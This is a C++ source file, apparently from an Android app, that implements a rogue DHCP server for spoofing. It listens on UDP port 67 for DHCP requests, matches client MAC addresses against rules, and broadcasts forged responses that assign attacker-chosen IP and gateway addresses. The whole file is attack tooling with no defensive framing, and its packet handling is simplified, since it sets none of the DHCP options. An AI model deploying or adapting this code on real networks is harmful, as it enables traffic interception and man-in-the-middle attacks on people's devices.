#include "dhcp_spoofing.h"
#include <android/log.h>
#include <cstring>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>

#define LOG_TAG "DHCPSpoofing"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// DHCP packet structures
struct dhcp_header {
    uint8_t op;           // Message type (1=request, 2=response)
    uint8_t htype;        // Hardware address type (1=Ethernet)
    uint8_t hlen;         // Hardware address length (6 for MAC)
    uint8_t hops;         // Client sets to 0
    uint32_t xid;         // Transaction ID
    uint16_t secs;        // Seconds elapsed
    uint16_t flags;       // Flags
    uint32_t ciaddr;      // Client IP address
    uint32_t yiaddr;      // Your IP address (assigned by server)
    uint32_t siaddr;      // Server IP address
    uint32_t giaddr;      // Gateway IP address
    uint8_t chaddr[16];   // Client hardware address
    uint8_t sname[64];    // Server hostname
    uint8_t file[128];    // Boot filename
    uint32_t magic_cookie; // DHCP magic cookie (0x63825363)
};

// Global variables for DHCP spoofing
static std::vector<DHCPSpoofRule> g_dhcp_rules;
static std::mutex g_dhcp_rules_mutex;
static std::atomic<bool> g_dhcp_spoof_active(false);
static std::thread *g_dhcp_spoof_thread = nullptr;
static int g_dhcp_socket = -1;
static std::atomic<bool> g_stop_dhcp_spoofing(false);

// Function to convert MAC address to string
std::string mac_to_string(const uint8_t *mac) {
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(mac_str);
}

// Function to convert string MAC to bytes
bool string_to_mac(const std::string& mac_str, uint8_t *mac) {
    int values[6];
    char sep[5];
    int n = sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x%c",
                   &values[0], &values[1], &values[2], 
                   &values[3], &values[4], &values[5], sep);
    
    if (n == 6) {
        for (int i = 0; i < 6; i++) {
            mac[i] = (uint8_t) values[i];
        }
        return true;
    }
    return false;
}

// Function to craft a DHCP offer/ACK packet
int craft_dhcp_response(const struct dhcp_header *request, 
                       struct dhcp_header *response, 
                       const DHCPSpoofRule& rule) {
    // Copy the request header to response
    memcpy(response, request, sizeof(struct dhcp_header));
    
    // Set response fields
    response->op = 2;  // DHCP response
    response->yiaddr = inet_addr(rule.spoofed_ip.c_str());  // Assign spoofed IP
    response->siaddr = inet_addr(rule.gateway_ip.c_str());  // Server IP
    response->magic_cookie = htonl(0x63825363);  // DHCP magic cookie
    
    LOGD("Crafted DHCP response for MAC %s -> IP %s", 
         mac_to_string(request->chaddr).c_str(), rule.spoofed_ip.c_str());
    
    return sizeof(struct dhcp_header);
}

// Function to handle incoming DHCP packets
void handle_dhcp_packet(unsigned char *packet, int packet_size, struct sockaddr_in * /*client_addr*/) {
    if (packet_size < (int)sizeof(struct dhcp_header)) {
        LOGE("DHCP packet too small: %d bytes", packet_size);
        return;
    }
    
    struct dhcp_header *header = (struct dhcp_header*)packet;
    
    // Check if this is a DHCP discover/request message
    if (header->op != 1) {  // Not a request
        return;
    }
    
    // Check for DHCP magic cookie
    if (ntohl(header->magic_cookie) != 0x63825363) {
        LOGE("Invalid DHCP magic cookie");
        return;
    }
    
    std::string client_mac = mac_to_string(header->chaddr);
    LOGD("Received DHCP request from MAC: %s", client_mac.c_str());
    
    // Check if this MAC matches any of our spoofing rules
    DHCPSpoofRule matched_rule;
    bool rule_found = false;
    
    {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        for(const auto& rule : g_dhcp_rules) {
            if(rule.target_mac == client_mac) {
                matched_rule = rule;
                rule_found = true;
                break;
            }
        }
    }
    
    if(rule_found) {
        LOGD("DHCP spoofing rule matched for %s -> %s", 
             client_mac.c_str(), matched_rule.spoofed_ip.c_str());
        
        // Craft a DHCP response packet
        struct dhcp_header response;
        int response_size = craft_dhcp_response(header, &response, matched_rule);
        
        // Send the spoofed response back to the client
        int dhcp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(dhcp_sock >= 0) {
            // Set socket options to allow binding to privileged port
            int opt = 1;
            setsockopt(dhcp_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
            setsockopt(dhcp_sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
            
            struct sockaddr_in response_addr;
            memset(&response_addr, 0, sizeof(response_addr));
            response_addr.sin_family = AF_INET;
            response_addr.sin_port = htons(68);  // BOOTP client port
            response_addr.sin_addr.s_addr = INADDR_BROADCAST;  // Broadcast to all clients
            
            ssize_t sent = sendto(dhcp_sock, &response, response_size, 0, 
                                  (struct sockaddr*)&response_addr, sizeof(response_addr));
            
            if(sent > 0) {
                LOGD("Sent spoofed DHCP response to %s (%d bytes)", 
                     client_mac.c_str(), (int)sent);
            } else {
                LOGE("Failed to send DHCP response: %s", strerror(errno));
            }
            
            close(dhcp_sock);
        }
    } else {
        LOGD("No DHCP spoofing rule found for MAC: %s", client_mac.c_str());
    }
}

// Main DHCP spoofing thread function
void dhcp_spoof_thread_func(const std::string& interface) {
    LOGD("Starting DHCP spoofing on interface: %s", interface.c_str());
    
    // Create raw socket to capture DHCP packets (UDP port 67)
    g_dhcp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(g_dhcp_socket < 0) {
        LOGE("Failed to create DHCP spoofing socket: %s", strerror(errno));
        return;
    }
    
    // Allow port reuse and broadcast
    int opt = 1;
    setsockopt(g_dhcp_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(g_dhcp_socket, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
    
    // Bind to DHCP server port (67)
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(67);  // DHCP server port
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Listen on all interfaces
    
    if(bind(g_dhcp_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        LOGE("Failed to bind DHCP socket to port 67: %s", strerror(errno));
        close(g_dhcp_socket);
        g_dhcp_socket = -1;
        return;
    }
    
    g_stop_dhcp_spoofing = false;
    
    // Buffer for incoming packets
    unsigned char packet_buffer[1500];  // Standard Ethernet frame size
    
    LOGD("DHCP spoofing listening on port 67...");
    
    while(!g_stop_dhcp_spoofing) {
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        
        int packet_size = recvfrom(g_dhcp_socket, packet_buffer, sizeof(packet_buffer), 0,
                                   (struct sockaddr*)&client_addr, &addr_len);
        
        if(packet_size < 0) {
            if(errno == EINTR) continue;
            LOGE("Error receiving DHCP packet: %s", strerror(errno));
            break;
        }
        
        // Handle the DHCP packet
        handle_dhcp_packet(packet_buffer, packet_size, &client_addr);
    }
    
    close(g_dhcp_socket);
    g_dhcp_socket = -1;
    LOGD("DHCP spoofing thread stopped");
}

bool dhcp_spoof_init() {
    LOGD("Initializing DHCP spoofing operations");
    return true;
}

bool dhcp_start_spoofing(const char *interface, const std::vector<DHCPSpoofRule>& rules) {
    LOGD("Starting DHCP spoofing on interface: %s", interface);
    
    if(g_dhcp_spoof_active.load()) {
        LOGE("DHCP spoofing is already active");
        return false;
    }
    
    // Apply the rules
    {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        g_dhcp_rules = rules;
    }
    
    // Start the spoofing thread
    try {
        g_dhcp_spoof_thread = new std::thread(dhcp_spoof_thread_func, std::string(interface));
        g_dhcp_spoof_active = true;
        LOGD("DHCP spoofing started successfully");
        return true;
    } catch(const std::exception& e) {
        LOGE("Failed to start DHCP spoofing thread: %s", e.what());
        return false;
    }
}

void dhcp_stop_spoofing() {
    LOGD("Stopping DHCP spoofing");
    
    if(!g_dhcp_spoof_active.load()) {
        LOGD("DHCP spoofing is not active");
        return;
    }
    
    g_stop_dhcp_spoofing = true;
    
    if(g_dhcp_socket >= 0) {
        close(g_dhcp_socket);
        g_dhcp_socket = -1;
    }
    
    if(g_dhcp_spoof_thread && g_dhcp_spoof_thread->joinable()) {
        g_dhcp_spoof_thread->join();
        delete g_dhcp_spoof_thread;
        g_dhcp_spoof_thread = nullptr;
    }
    
    g_dhcp_spoof_active = false;
    LOGD("DHCP spoofing stopped");
}

void dhcp_add_rule(const char *target_mac, const char *spoofed_ip, 
                  const char *gateway_ip, const char *subnet_mask, 
                  const char *dns_server) {
    if(target_mac && spoofed_ip && gateway_ip && subnet_mask && dns_server) {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        // Check if rule already exists
        for(auto& rule : g_dhcp_rules) {
            if(rule.target_mac == target_mac) {
                rule.spoofed_ip = spoofed_ip;
                rule.gateway_ip = gateway_ip;
                rule.subnet_mask = subnet_mask;
                rule.dns_server = dns_server;
                LOGD("Updated DHCP spoofing rule for %s to %s", target_mac, spoofed_ip);
                return;
            }
        }
        // Add new rule
        g_dhcp_rules.push_back({
            target_mac, spoofed_ip, gateway_ip, subnet_mask, dns_server
        });
        LOGD("Added DHCP spoofing rule: %s -> %s", target_mac, spoofed_ip);
    }
}

void dhcp_remove_rule(const char *target_mac) {
    if(target_mac) {
        std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
        g_dhcp_rules.erase(
            std::remove_if(g_dhcp_rules.begin(), g_dhcp_rules.end(),
                          [target_mac](const DHCPSpoofRule& rule) {
                              return rule.target_mac == target_mac;
                          }),
            g_dhcp_rules.end()
        );
        LOGD("Removed DHCP spoofing rule for %s", target_mac);
    }
}

void dhcp_clear_rules() {
    std::lock_guard<std::mutex> lock(g_dhcp_rules_mutex);
    g_dhcp_rules.clear();
    LOGD("Cleared all DHCP spoofing rules");
}

bool dhcp_is_active() {
    return g_dhcp_spoof_active.load();
}

void dhcp_spoof_cleanup() {
    LOGD("Cleaning up DHCP spoofing operations");
    dhcp_stop_spoofing();
    dhcp_clear_rules();
}